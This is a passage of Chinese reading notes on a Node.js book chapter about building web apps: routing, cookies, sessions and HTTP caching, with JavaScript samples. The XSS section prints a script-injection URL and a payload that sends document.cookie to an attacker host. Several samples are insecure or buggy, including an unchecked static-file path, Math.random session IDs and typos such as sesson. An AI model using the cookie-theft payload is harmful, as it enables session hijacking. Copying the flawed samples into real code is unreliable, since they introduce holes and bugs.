title: 《深入浅出Node.js》-读书笔记-构建Web应用
author: songxingguo
tags:
  - Node
categories:
  - 读书笔记
date: 2018-10-06 16:35:00
---
## 构建Web应用

如今看来，Web应用俨然是互联网的主角，伴随Web 1.0、Web 2.0一路走来，HTTP占据了网络中的大多数流量。随着移动互联网时代的到来，Web又开始在移动浏览器上发挥光和热。在Web标准化的努力过后，Web又开始朝向应用化发展，JavaScript在前端变得炙手可热。许多原本在服务器端实现的业务细节，纷纷前移到浏览器端，前端MV*的架构也日趋成熟。与之逆流的是，Node的出现将前后端的壁垒再次打破，JavaScript这门最初就能运行在服务器端的语言，在经历了前端的辉煌和后端的低迷后，借助事件驱动和V8的高性能，再次成为了服务器端的佼佼者。在Web应用中，JavaScript将不再仅仅出现在前端浏览器中，因为Node的出现，“前端”将会被重新定义。

<!--  more -->

为了胜任Web应用的开发工作，各种语言、模式、框架层出不穷。单从框架而言，在后端数得出来大名的就有Structs、CodeIgniter、Rails、Django、web.py等，在前端也有知名的BackBone、Knockout. js、AngularJS、Meteor等。在Node中，有Connect中间件，也有Express这样的MVC框架。值得注意的是Meteor框架，它在后端是Node，在前端是JavaScript，它是一个融合了前后端JavaScript的框架。

由于前后端采用的语言都是JavaScript，在跨越HTTP进行沟通时，会有一些额外的好处。

- 无须切换语言环境，部分知识不会因为语言环境的切换而丢失，上下文一致性较好。
- 数据（因为JSON）可以很好地实现跨前后端直接使用。
- 一些业务（如模板渲染）可以很自由地轻量地选择是在前端还是在后端进行，因为编程语言相同，所以切换代价小。

### 基础功能

request事件发生于网络连接建立，客户端向服务器端发送报文，服务器端解析报文，发现HTTP请求的报头时。在已触发reqeust事件前，它已准备好ServerRequest和ServerResponse对象以供对请求和响应报文的操作。

以官方经典的Hello World为例，就是调用ServerResponse实现响应的，如下所示：

```js
var http = require('http');
http.createServer(function(req, res) {
  res.writeHead(200, {
    'Content-Type': 'text/plain'
  });
  res.end('Hello World\n');
}).listen(1337, '127.0.0.1');
console.log('Server running at http://127.0.0.1:1337/');
```
对于一个Web应用而言，仅仅只是上面这样的响应远远达不到业务的需求。在具体的业务中，我们可能有如下这些需求。

- 请求方法的判断。
- URL的路径解析。
- URL中查询字符串解析。
- Cookie的解析。
- Basic认证。
- 表单数据的解析。
- 任意格式文件的上传处理。

除此之外，可能还有Session（会话）的需求。尽管Node提供的底层API相对来说比较简单，但要完成业务需求，还需要大量的工作，仅仅一个request事件似乎无法满足这些需求。但是要实现这些需求并非难事，一切的一切，都从如下这个函数展开：

```js
function(req, res) {
  res.writeHead(200, {
    'Content-Type': 'text/plain'
  });
  res.end();
}
```
在第4章中，我们曾对高阶函数有过简单的介绍：我们的应用可能无限地复杂，但是只要最终结果返回一个上面的函数作为参数，传递给createServer()方法作为request事件的侦听器就可以了。

你可能看到Connect或Express的示例中有如下这样的代码：

```js
var app = connect();
// var app = express(); 
// TODO
http.createServer(app).listen(1337);
```
它的原理即是如此。我们在具体业务开始前，需要为业务预处理一些细节，这些细节将会挂载在req或res对象上，供业务代码使用。

#### 请求方法

在Web应用中，最常见的请求方法是GET和POST，除此之外，还有HEAD、DELETE、PUT、CONNECT等方法。请求方法存在于报文的第一行的第一个单词，通常是大写。如下为一个报文头的示例：

```
> GET /path?foo=bar HTTP/1.1 
> User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 
> Host: 127.0.0.1:1337 
> Accept: */* 
>
```
HTTP_Parser在解析请求报文的时候，将报文头抽取出来，设置为req.method。通常，我们只需要处理GET和POST两类请求方法，但是在RESTful类Web服务中请求方法十分重要，因为它会决定资源的操作行为。PUT代表新建一个资源，POST表示要更新一个资源，GET表示查看一个资源，而DELETE表示删除一个资源。

我们可以通过请求方法来决定响应行为，如下所示：

```js
function(req, res) {
  switch (req.method) {
  case 'POST':
    update(req, res);
    break;
  case 'DELETE':
    remove(req, res);
    break;
  case 'PUT':
    create(req, res);
    break;
  case 'GET':
  default:
    get(req, res);
  }
}
```
上述代码代表了一种根据请求方法将复杂的业务逻辑分发的思路，是一种化繁为简的方式。

#### 路径解析

除了根据请求方法来进行分发外，最常见的请求判断莫过于路径的判断了。路径部分存在于报文的第一行的第二部分，如下所示：

```
GET /path?foo=bar HTTP/1.1
```
HTTP_Parser将其解析为req.url。一般而言，完整的URL地址是如下这样的：

```
http://user:pass@host.com:8080/p/a/t/h?query=string#hash
```
客户端代理（浏览器）会将这个地址解析成报文，将路径和查询部分放在报文第一行。需要注意的是，hash部分会被丢弃，不会存在于报文的任何地方。

最常见的根据路径进行业务处理的应用是静态文件服务器，它会根据路径去查找磁盘中的文件，然后将其响应给客户端，如下所示：

```js
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  fs.readFile(path.join(ROOT, pathname),
  function(err, file) {
    if (err) {
      res.writeHead(404);
      res.end('找不到相关文件。- -');
      return;
    }
    res.writeHead(200);
    res.end(file);
  });
}
```
还有一种比较常见的分发场景是根据路径来选择控制器，它预设路径为控制器和行为的组合，无须额外配置路由信息，如下所示：

```
/controller/action/a/b/c
```
这里的controller会对应到一个控制器，action对应到控制器的行为，剩余的值会作为参数进行一些别的判断。

```js
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  var paths = pathname.split('/');
  var controller = paths[1] || 'index';
  var action = paths[2] || 'index';
  var args = paths.slice(3);
  if (handles[controller] && handles[controller][action]) {
    handles[controller][action].apply(null, [req, res].concat(args));
  } else {
    res.writeHead(500);
    res.end('找不到响应控制器');
  }
}
```
这样我们的业务部分可以只关心具体的业务实现，如下所示：

```js
handles.index = {};
handles.index.index = function(req, res, foo, bar) {
  res.writeHead(200);
  res.end(foo);
};
```
#### 查询字符串

查询字符串位于路径之后，在地址栏中路径后的?foo=bar&baz=val字符串就是查询字符串。这个字符串会跟随在路径后，形成请求报文首行的第二部分。这部分内容经常需要为业务逻辑所用，Node提供了querystring模块用于处理这部分数据，如下所示：

```js
var url = require('url');
var querystring = require('querystring');
var query = querystring.parse(url.parse(req.url).query);
```
更简洁的方法是给url.parse()传递第二个参数，如下所示：

```js
var query = url.parse(req.url, true).query;
```
它会将foo=bar&baz=val解析为一个JSON对象，如下所示：

```
{ 
  foo: 'bar', 
  baz: 'val' 
}
```
在业务调用产生之前，我们的中间件或者框架会将查询字符串转换，然后挂载在请求对象上供业务使用，如下所示：

```js
function (req, res) { 
  req.query = url.parse(req.url, true).query; 
  hande(req, res); 
}
```
要注意的点是，如果查询字符串中的键出现多次，那么它的值会是一个数组，如下所示：

```js
// foo=bar&foo=baz 
var query = url.parse(req.url, true).query; 
// { 
//   foo: ['bar', 'baz']
// }
```
业务的判断一定要检查值是数组还是字符串，否则可能出现TypeError异常的情况。

#### Cookie

1. 初识Cookie

在Web应用中，请求路径和查询字符串对业务至关重要，通过它们已经可以进行很多业务操作了，但是HTTP是一个无状态的协议，现实中的业务却是需要一定的状态的，否则无法区分用户之间的身份。如何标识和认证一个用户，最早的方案就是Cookie（曲奇饼）了。

Cookie最早由文本浏览器Lynx合作开发者Lou Montulli在1994年网景公司开发Netscape浏览器的第一个版本时发明。它能记录服务器与客户端之间的状态，最早的用处就是用来判断用户是否第一次访问网站。在1997年形成规范RFC 2109，目前最新的规范为RFC 6265，它是一个由浏览器和服务器共同协作实现的规范。
Cookie的处理分为如下几步。

- 服务器向客户端发送Cookie。
- 浏览器将Cookie保存。
- 之后每次浏览器都会将Cookie发向服务器端。

客户端发送的Cookie在请求报文的Cookie字段中，我们可以通过curl工具构造这个字段，如下所示：

```
curl -v -H "Cookie: foo=bar; 
baz=val" "http://127.0.0.1:1337/
path?foo=bar&foo=baz"
```
HTTP_Parser会将所有的报文字段解析到req.headers上，那么Cookie就是req.headers.cookie。根据规范中的定义，Cookie值的格式是key=value; key2=value2形式的，如果我们需要Cookie，解析它也十分容易，如下所示：

```js
var parseCookie = function(cookie) {
  var cookies = {};
  if (!cookie) {
    return cookies;
  }
  var list = cookie.split(';');
  for (var i = 0; i < list.length; i++) {
    var pair = list[i].split('=');
    cookies[pair[0].trim()] = pair[1];
  }
  return cookies;
};
```
在业务逻辑代码执行之前，我们将其挂载在req对象上，让业务代码可以直接访问，如下所示：

```js
function(req, res) {
  req.cookies = parseCookie(req.headers.cookie);
  hande(req, res);
}
```
这样我们的业务代码就可以进行判断处理了，如下所示：

```js
var handle = function(req, res) {
  res.writeHead(200);
  if (!req.cookies.isVisit) {
    res.end('欢迎第一次来到动物园');
  } else {
    // TODO 
  }
};
```
任何请求报文中，如果Cookie值没有isVisit，都会收到“欢迎第一次来到动物园”这样的响应。这里提出一个问题，如果识别到用户没有访问过我们的站点，那么我们的站点是否应该告诉客户端已经访问过的标识呢？告知客户端的方式是通过响应报文实现的，响应的Cookie值在Set-Cookie字段中。它的格式与请求中的格式不太相同，规范中对它的定义如下所示：

```
Set-Cookie: name=value; Path=/; 
Expires=Sun, 23-Apr-23 09:01:35 GMT; 
Domain=.domain.com;
```
其中name=value是必须包含的部分，其余部分皆是可选参数。这些可选参数将会影响浏览器在后续将Cookie发送给服务器端的行为。以下为主要的几个选项。

- path表示这个Cookie影响到的路径，当前访问的路径不满足该匹配时，浏览器则不发送这个Cookie。
- Expires和Max-Age是用来告知浏览器这个Cookie何时过期的，如果不设置该选项，在关闭浏览器时会丢失掉这个Cookie。如果设置了过期时间，浏览器将会把Cookie内容写入到磁盘中并保存，下次打开浏览器依旧有效。Expires的值是一个UTC格式的时间字符串，告知浏览器此Cookie何时将过期，Max-Age则告知浏览器此Cookie多久后过期。前者一般而言不存在问题，但是如果服务器端的时间和客户端的时间不能匹配，这种时间设置就会存在偏差。为此，Max-Age告知浏览器这条Cookie多久之后过期，而不是一个具体的时间点。
- HttpOnly告知浏览器不允许通过脚本document.cookie去更改这个Cookie值，事实上，设置HttpOnly之后，这个值在document.cookie中不可见。但是在HTTP请求的过程中，依然会发送这个Cookie到服务器端。
- Secure。当Secure值为true时，在HTTP中是无效的，在HTTPS中才有效，表示创建的Cookie只能在HTTPS连接中被浏览器传递到服务器端进行会话验证，如果是HTTP连接则不会传递该信息，所以很难被窃听到。

知道Cookie在报文头中的具体格式后，下面我们将Cookie序列化成符合规范的字符串，相关代码如下：

```js
var serialize = function(name, val, opt) {
  var pairs = [name + '=' + encode(val)];
  opt = opt || {};
  if (opt.maxAge) pairs.push('Max-Age=' + opt.maxAge);
  if (opt.domain) pairs.push('Domain=' + opt.domain);
  if (opt.path) pairs.push('Path=' + opt.path);
  if (opt.expires) pairs.push('Expires=' + opt.expires.toUTCString());
  if (opt.httpOnly) pairs.push('HttpOnly');
  if (opt.secure) pairs.push('Secure');
  return pairs.join('; ');
};
```
略改前文的访问逻辑，我们就能轻松地判断用户的状态了，如下所示：

```js
var handle = function(req, res) {
  if (!req.cookies.isVisit) {
    res.setHeader('Set-Cookie', serialize('isVisit', '1'));
    res.writeHead(200);
    res.end('欢迎第一次来到动物园');
  } else {
    res.writeHead(200);
    res.end('动物园再次欢迎你');
  }
};
```
客户端收到这个带Set-Cookie的响应后，在之后的请求时会在Cookie字段中带上这个值。值得注意的是，Set-Cookie是较少的，在报头中可能存在多个字段。为此res.setHeader的第二个参数可以是一个数组，如下所示：

```js
res.setHeader('Set-Cookie', [serialize('foo', 'bar'), serialize('baz', 'val')]);
```
这会在报文头部中形成两条Set-Cookie字段：

```
Set-Cookie: foo=bar; Path=/; Expires=Sun, 23-Apr-23 09:01:35 
GMT; Domain=.domain.com; 
Set-Cookie: baz=val; Path=/; 
Expires=Sun, 23-Apr-23 09:01:35
GMT;Domain=.domain.com
```
2. Cookie的性能影响

由于Cookie的实现机制，一旦服务器端向客户端发送了设置Cookie的意图，除非Cookie过期，否则客户端每次请求都会发送这些Cookie到服务器端，一旦设置的Cookie过多，将会导致报头较大。大多数的Cookie并不需要每次都用上，因为这会造成带宽的部分浪费。在YSlow的性能优化规则中有这么一条：

减小Cookie的大小

更严重的情况是，如果在域名的根节点设置Cookie，几乎所有子路径下的请求都会带上这些Cookie，这些Cookie在某些情况下是有用的，但是在有些情况下是完全无用的。其中以静态文件最为典型，静态文件的业务定位几乎不关心状态，Cookie对它而言几乎是无用的，但是一旦有Cookie设置到相同域下，它的请求中就会带上Cookie。好在Cookie在设计时限定了它的域，只有域名相同时才会发送。所以YSlow中有另外一条规则用来避免Cookie带来的性能影响。

为静态组件使用不同的域名

简而言之就是，为不需要Cookie的组件换个域名可以实现减少无效Cookie的传输。所以很多网站的静态文件会有特别的域名，使得业务相关的Cookie不再影响静态资源。当然换用额外的域名带来的好处不只这点，还可以突破浏览器下载线程数量的限制，因为域名不同，可以将下载线程数翻倍。但是换用额外域名还是有一定的缺点的，那就是将域名转换为IP需要进行DNS查询，多一个域名就多一次DNS查询。YSlow中有这样一条规则：

减少DNS查询

看起来减少DNS查询和使用不同的域名是冲突的两条规则，但是好在现今的浏览器都会进行DNS缓存，以削弱这个副作用的影响。

Cookie除了可以通过后端添加协议头的字段设置外，在前端浏览器中也可以通过JavaScript进行修改，浏览器将Cookie通过document.cookie暴露给了JavaScript。前端在修改Cookie之后，后续的网络请求中就会携带上修改过后的值。

目前，广告和在线统计领域是最为依赖Cookie的，通过嵌入第三方的广告或者统计脚本，将Cookie和当前页面绑定，这样就可以标识用户，得到用户的浏览行为，广告商就可以定向投放广告了。尽管这样的行为看起来很可怕，但是从Cookie的原理来说，它只能做到标识，而不能做任何具有破坏性的事情。如果依然担心自己站点的用户被记录下行为，那就不要挂任何第三方的脚本。

#### Session

通过Cookie，浏览器和服务器可以实现状态的记录。但是Cookie并非是完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是Cookie可以在前后端进行修改，因此数据就极容易被篹改和伪造。如果服务器端有部分逻辑是根据Cookie中的isVIP字段进行判断，那么一个普通用户通过修改Cookie就可以轻松享受到VIP服务了。综上所述，Cookie对于敏感数据的保护是无效的。

为了解决Cookie敏感数据的问题，Session应运而生。Session的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无须在协议中每次都被传递。虽然在服务器端存储数据十分方便，但是如何将每个客户和服务器中的数据一一对应起来，这里有常见的两种实现方式。

第一种：基于Cookie来实现用户和数据的映射

虽然将所有数据都放在Cookie中不可取，但是将口令放在Cookie中还是可以的。因为口令一旦被篹改，就丢失了映射关系，也无法修改服务器端存在的数据了。并且Session的有效期通常较短，普遍的设置是20分钟，如果在20分钟内客户端和服务器端没有交互产生，服务器端就将数据删除。由于数据过期时间较短，且在服务器端存储数据，因此安全性相对较高。那么口令是如何产生的呢？

一旦服务器端启用了Session，它将约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，Tomcat会采用jsessionid等。一旦服务器检查到用户请求Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重复的值，并设定超时时间。以下为生成session的代码：

```js
var sessions = {};
var key = 'session_id';
var EXPIRES = 20 * 60 * 1000;
var generate = function() {
  var session = {};
  session.id = (new Date()).getTime() + Math.random();
  session.cookie = {
    expire: (new Date()).getTime() + EXPIRES
  };
  sessions[session.id] = session;
  return session;
};
```
每个请求到来时，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成，如下所示：

```js
function(req, res) {
  var id = req.cookies[key];
  if (!id) {
    req.session = generate();
  } else {
    var session = sessions[id];
    if (session) {
      if (session.cookie.expire > (new Date()).getTime()) {
        // 更新超时时间 session.cookie.expire = (new Date()).getTime() + EXPIRES; 
        req.session = session;
      } else {
        // 超时了，删除旧的数据，并重新生成 delete sessions[id]; 
        req.session = generate();
      }
    } else { // 如果session过期或口令不对，重新生成session 
      req.session = generate();
    }
  }
  handle(req, res);
}
```
当然仅仅重新生成Session还不足以完成整个流程，还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据。这里我们hack响应对象的writeHead()方法，在它的内部注入设置Cookie的逻辑，如下所示：

```js
var writeHead = res.writeHead;
res.writeHead = function() {
  var cookies = res.getHeader('Set-Cookie');
  var session = serialize('Set-Cookie', req.session.id);
  cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session];
  res.setHeader('Set-Cookie', cookies);
  return writeHead.apply(this, arguments);
};
```
至此，session在前后端进行对应的过程就完成了。这样的业务逻辑可以判断和设置session，以此来维护用户与服务器端的关系，如下所示：

```js
var handle = function(req, res) {
  if (!req.session.isVisit) {
    res.session.isVisit = true;
    res.writeHead(200);
    res.end('欢迎第一次来到动物园');
  } else {
    res.writeHead(200);
    res.end('动物园再次欢迎你');
  }
};
```
这样在session中保存的数据比直接在Cookie中保存数据要安全得多。这种实现方案依赖Cookie实现，而且也是目前大多数Web应用的方案。如果客户端禁止使用Cookie，这个世界上大多数的网站将无法实现登录等操作。

第二种：通过查询字符串来实现浏览器端和服务器端数据的对应

它的原理是检查请求的查询字符串，如果没有值，会先生成新的带值的URL，如下所示：

```js
var getURL = function(_url, key, value) {
  var obj = url.parse(_url, true);
  obj.query[key] = value;
  return url.format(obj);
};
```
然后形成跳转，让客户端重新发起请求，如下所示：

```js
function(req, res) {
  var redirect = function(url) {
    res.setHeader('Location', url);
    res.writeHead(302);
    res.end();
  };
  var id = req.query[key];
  if (!id) {
    var session = generate();
    redirect(getURL(req.url, key, session.id));
  } else {
    var session = sessions[id];
    if (session) {
      if (session.cookie.expire > (new Date()).getTime()) {
        // 更新超时时间 session.cookie.expire = (new Date()).getTime() + EXPIRES; 
        req.session = session;
        handle(req, res);
      } else { // 超时了，删除旧的数据，并重新生成 
        delete sessions[id];
        var session = generate();
        redirect(getURL(req.url, key, session.id));
      }
    } else { // 如果session过期或口令不对，重新生成session 
      var session = generate();
      redirect(getURL(req.url, key, session.id));
    }
  }
}
```
用户访问http://localhost/pathname 时，如果服务器端发现查询字符串中不带session_id参数，就会将用户跳转到http://localhost/pathname?session_id=12344567 
这样一个类似的地址。如果浏览器收到302状态码和Location报头，就会重新发起新的请求，如下所示：

```
< HTTP/1.1 302 Moved Temporarily 
< Location: /pathname?
session_id=12344567
```
这样，新的请求到来时就能通过Session的检查，除非内存中的数据过期。

有的服务器在客户端禁用Cookie时，会采用这种方案实现退化。通过这种方案，无须在响应时设置Cookie。但是这种方案带来的风险远大于基于Cookie实现的风险，因为只要将地址栏中的地址发给另外一个人，那么他就拥有跟你相同的身份。Cookie的方案在换了浏览器或者换了电脑之后无法生效，相对较为安全。

还有一种比较有趣的处理Session的方式是利用HTTP请求头中的ETag，同样对于更换浏览器和电脑后也是无效的，具体的细节这里就不展开了，感兴趣的朋友可以到网上查阅相关资料。

1. Session与内存

在上面的示例代码中，我们都将Session数据直接存在变量sessions中，它位于内存中。然而在第5章的内存控制部分，我们分析了为什么Node会存在内存限制，这里将数据存放在内存中将会带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会引起垃圾回收的频繁扫描，引起性能问题。

另一个问题则是我们可能为了利用多核CPU而启动多个进程，这个细节在第9章中有详细描述。用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的Session可能会引起错乱。

为了解决性能问题和Session数据无法跨进程共享的问题，常用的方案是将Session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中。目前常用的工具是Redis、Memcached等，通过这些高效的缓存，Node进程无须在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效，比在Node中自行设计缓存策略更好。

采用第三方缓存来存储Session引起的一个问题是会引起网络访问。理论上来说访问网络中的数据要比访问本地磁盘中的数据速度要慢，因为涉及到握手、传输以及网络终端自身的磁盘I/O等，尽管如此但依然会采用这些高速缓存的理由有以下几条：

- Node与缓存服务保持长连接，而非频繁的短连接，握手导致的延迟只影响初始化。
- 高速缓存直接在内存中进行数据存储和访问。
- 缓存服务通常与Node进程运行在相同的机器上或者相同的机房里，网络速度受到的影响较小。尽管采用专门的缓存服务会比直接在内存中访问慢，但其影响小之又小，带来的好处却远远大于直接在Node中保存数据。

为此，一旦Session需要异步的方式获取，代码就需要略作调整，变成异步的方式，如下所示：

```js
function(req, res) {
  var id = req.cookies[key];
  if (!id) {
    req.session = generate();
    handle(req, res);
  } else {
    store.get(id,
    function(err, sesson) {
      if (session) {
        if (session.cookie.expire > (new Date()).getTime()) {
          // 更新超时时间 session.cookie.expire = (new Date()).getTime() + EXPIRES; 
          req.session = session;
        } else {
          // 超时了，删除旧的数据，并重新生成 delete sessions[id]; 
          req.session = generate();
        }
      } else { // 如果session过期或口令不对，重新生成session 
        req.session = generate();
      }
      handle(req, res);
    });
  }
}
```
在响应时，将新的session保存回缓存中，如下所示：

```js
var writeHead = res.writeHead;
res.writeHead = function() {
  var cookies = res.getHeader('Set-Cookie');
  var session = serialize('Set-Cookie', req.session.id);
  cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session];
  res.setHeader('Set-Cookie', cookies); // 保存回缓存 
  store.save(req.session);
  return writeHead.apply(this, arguments);
};
```
2. Session与安全

从前文可以知道，尽管我们的数据都放置在后端了，使得它能保障安全，但是无论通过Cookie，还是查询字符串的实现方式，Session的口令依然保存在客户端，这里会存在口令被盗用的情况。如果Web应用的用户十分多，自行设计的随机算法的一些口令值就有理论机会命中有效的口令值。一旦口令被伪造，服务器端的数据也可能间接被利用。这里提到的Session的安全，就主要指如何让这个口令更加安全。

有一种做法是将这个口令通过私钥加密进行签名，使得伪造的成本较高。客户端尽管可以伪造口令值，但是由于不知道私钥值，签名信息很难伪造。如此，我们只要在响应时将口令和签名进行对比，如果签名非法，我们将服务器端的数据立即过期即可，如下所示：

```js
// 将值通过私钥签名，由.分割原值和签名 
var sign = function(val, secret) {
  return val + '.' + crypto.createHmac('sha256', secret).update(val).digest('base64').replace(/\=+$/, '');
};
```
在响应时，设置session值到Cookie中或者跳转URL中，如下所示：

```js
var val = sign(req.sessionID, secret); 
res.setHeader('Set-Cookie', cookie.serialize(key, val));
```
接收请求时，检查签名，如下所示：

```js
// 取出口令部分进行签名，对比用户提交的值 
var unsign = function (val, secret) { 
  var str = val.slice(0, val.lastIndexOf('.'));
  return sign(str, secret) == val ? str: false;
};
```
这样一来，即使攻击者知道口令中.号前的值是服务器端Session的ID值，只要不知道secret私钥的值，就无法伪造签名信息，以此实现对Session的保护。该方法被Connect中间件框架所使用，保护好私钥，就是在保障自己Web应用的安全。

当然，将口令进行签名是一个很好的解决方案，但是如果攻击者通过某种方式获取了一个真实的口令和签名，他就能实现身份的伪装。一种方案是将客户端的某些独有信息与口令作为原值，然后签名，这样攻击者一旦不在原始的客户端上进行访问，就会导致签名失败。这些独有信息包括用户IP和用户代理（User Agent）。

但是原始用户与攻击者之间也存在上述信息相同的可能性，如局域网出口IP相同，相同的客户端信息等，不过纳入这些考虑能够提高安全性。通常而言，将口令存在Cookie中不容易被他人获取，但是一些别的漏洞可能导致这个口令被泄漏，典型的有XSS漏洞，下面简单介绍一下如何通过XSS拿到用户的口令，实现伪造。

XSS漏洞

XSS的全称是跨站脚本攻击（Cross Site Scripting，通常简称为XSS），通常都是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS漏洞会让别的脚本执行。它的主要形成原因多数是用户的输入没有被转义，而被直接执行。

下面是某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下所示：

```js
$('#box').html(location.hash.replace('#', ''));
```
攻击者在发现这里的漏洞后，构造了这样的URL：

```html
http://a.com/pathname#<script src="http://b.com/c.js"></script>
```
为了不让受害者直接发现这段URL中的猫腻，它可能会通过URL压缩成一个短网址，如下所示：

```
http://t.cn/fasdlfj 
// 或者再次压缩 
http://url.cn/fasdlfb
```
然后将最终的短网址发给某个登录的在线用户。这样一来，这段hash中的脚本将会在这个用户的浏览器中执行，而这段脚本中的内容如下所示：

```js
location.href = "http://c.com/?" + document.cookie;
```
这段代码将该用户的Cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令。然后他在客户端中用这个口令伪造Cookie，从而实现了伪装用户的身份。如果该用户是网站管理员，就可能造成极大的危害。

XSS造成的危害远远不止这些，这里不再过多介绍。在这个案例中，如果口令中有用户的客户端信息的签名，即使口令被泄漏，除非攻击者与用户客户端完全相同，否则不能实现伪造。

#### 缓存

我们知道软件的架构经历过一次C/S模式到B/S模式的演变，在HTTP之上构建的应用，其客户端除了比普通桌面应用具备更轻量的升级和部署等特性外，在跨平台、跨浏览器、跨设备上也具备独特优势。传统客户端在安装后的应用过程中仅仅需要传输数据，Web应用还需要传输构成界面的组件（HTML、JavaScript、CSS文件等）。这部分内容在大多数场景下并不经常变更，却需要在每次的应用中向客户端传递，如果不进行处理，那么它将造成不必要的带宽浪费。如果网络速度较差，就需要花费更多时间来打开页面，对于用户的体验将会造成一定影响。因此节省不必要的传输，对用户和对服务提供者来说都有好处。

为了提高性能，YSlow中也提到几条关于缓存的规则。

- 添加Expires或Cache-Control到报文头中。
- 配置ETags。
- 让Ajax可缓存。

这里我们将展开这几条规则的来源。如何让浏览器缓存我们的静态资源，这也是一个需要由服务器与浏览器共同协作完成的事情。RFC 2616规范对此有一定的描述，只有遵循约定，整个缓存机制才能有效建立。通常来说，POST、DELETE、PUT这类带行为性的请求操作一般不做任何缓存，大多数缓存只应用在GET请求中。使用缓存的流程如下图所示。

![使用缓存的流程示意图](https://graphbed.qiniu.songxingguo.com/Node-Web-App/%E4%BD%BF%E7%94%A8%E7%BC%93%E5%AD%98%E7%9A%84%E6%B5%81%E7%A8%8B%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg)

简单来讲，本地没有文件时，浏览器必然会请求服务器端的内容，并将这部分内容放置在本地的某个缓存目录中。在第二次请求时，它将对本地文件进行检查，如果不能确定这份本地文件是否可以直接使用，它将会发起一次条件请求。所谓条件请求，就是在普通的GET请求报文中，附带If-Modified-Since字段，如下所示：

```
If-Modified-Since: Sun, 03 Feb 2013 06:01:12 GMT
```
它将询问服务器端是否有更新的版本，本地文件的最后修改时间。如果服务器端没有新的版本，只需响应一个304状态码，客户端就使用本地版本。如果服务器端有新的版本，就将新的内容发送给客户端，客户端放弃本地版本。代码如下所示：

```js
var handle = function(req, res) {
  fs.stat(filename,
  function(err, stat) {
    var lastModified = stat.mtime.toUTCString();
    if (lastModified === req.headers['if-modified-since']) {
      res.writeHead(304, "Not Modified");
      res.end();
    } else {
      fs.readFile(filename,
      function(err, file) {
        var lastModified = stat.mtime.toUTCString();
        res.setHeader("Last-Modified", lastModified);
        res.writeHead(200, "Ok");
        res.end(file);
      });
    }
  });
};
```
这里的条件请求采用时间戳的方式实现，但是时间戳有一些缺陷存在。

- 文件的时间戳改动但内容并不一定改动。
- 时间戳只能精确到秒级别，更新频繁的内容将无法生效。

为此HTTP1.1中引入了ETag来解决这个问题。ETag的全称是Entity Tag，由服务器端生成，服务器端可以决定它的生成规则。如果根据文件内容生成散列值，那么条件请求将不会受到时间戳改动造成的带宽浪费。下面是根据内容生成散列值的方法：

```js
var getHash = function(str) {
  var shasum = crypto.createHash('sha1');
  return shasum.update(str).digest('base64');
};
```
与If-Modified-Since/Last-Modified不同的是，ETag的请求和响应是If-None-Match/ETag，如下所示：

```js
var handle = function(req, res) {
  fs.readFile(filename,
  function(err, file) {
    var hash = getHash(file);
    var noneMatch = req['if-none-match'];
    if (hash === noneMatch) {
      res.writeHead(304, "Not Modified");
      res.end();
    } else {
      res.setHeader("ETag", hash);
      res.writeHead(200, "Ok");
      res.end(file);
    }
  });
};
```
浏览器在收到ETag: "83-1359871272000"这样的请求后，在下次的请求中，会将其放置在请求头中：If-None-Match:"83-1359871272000"。

尽管条件请求可以在文件内容没有修改的情况下节省带宽，但是它依然会发起一个HTTP请求，使得客户端依然会花一定时间来等待响应。可见最好的方案就是连条件请求都不用发起。那么如何让浏览器知晓是否能直接使用本地版本呢？答案就是服务器端在响应内容时，让浏览器明确地将内容缓存起来。如同YSlow规则里提到的，在响应里设置Expires或Cache-Control头，浏览器将根据该值进行缓存。那么这两个值有何区别呢？

HTTP1.0时，在服务器端设置Expires可以告知浏览器要缓存文件内容，如下代码所示：

```js
var handle = function(req, res) {
  fs.readFile(filename,
  function(err, file) {
    var expires = new Date();
    expires.setTime(expires.getTime() + 10 * 365 * 24 * 60 * 60 * 1000);
    res.setHeader("Expires", expires.toUTCString());
    res.writeHead(200, "Ok");
    res.end(file);
  });
};
```
Expires是一个GMT格式的时间字符串。浏览器在接到这个过期值后，只要本地还存在这个缓存文件，在到期时间之前它都不会再发起请求。YUI3的CDN实践是缓存文件在10年后过期。但是Expires的缺陷在于浏览器与服务器之间的时间可能不一致，这可能会带来一些问题，比如文件提前过期，或者到期后并没有被删除。在这种情况下，Cache-Control以更丰富的形式，实现相同的功能，如下所示：

```js
var handle = function(req, res) {
  fs.readFile(filename,
  function(err, file) {
    res.setHeader("Cache-Control", "max-age=" + 10 * 365 * 24 * 60 * 60 * 1000);
    res.writeHead(200, "Ok");
    res.end(file);
  });
};
```
上面的代码为Cache-Control设置了max-age值，它比Expires优秀的地方在于，Cache-Control能够避免浏览器端与服务器端时间不同步带来的不一致性问题，只要进行类似倒计时的方式计算过期时间即可。除此之外，Cache-Control的值还能设置public、private、no-cache、no-store等能够更精细地控制缓存的选项。

由于在HTTP1.0时还不支持max-age，如今的服务器端在模块的支持下多半同时对Expires和Cache-Control进行支持。在浏览器中如果两个值同时存在，且被同时支持时，max-age会覆盖Expires。

清除缓存

虽然我们知晓了如何设置缓存，以达到节省网络带宽的目的，但是缓存一旦设定，当服务器端意外更新内容时，却无法通知客户端更新。这使得我们在使用缓存时也要为其设定版本号，所幸浏览器是根据URL进行缓存，那么一旦内容有所更新时，我们就让浏览器发起新的URL请求，使得新内容能够被客户端更新。一般的更新机制有如下两种。

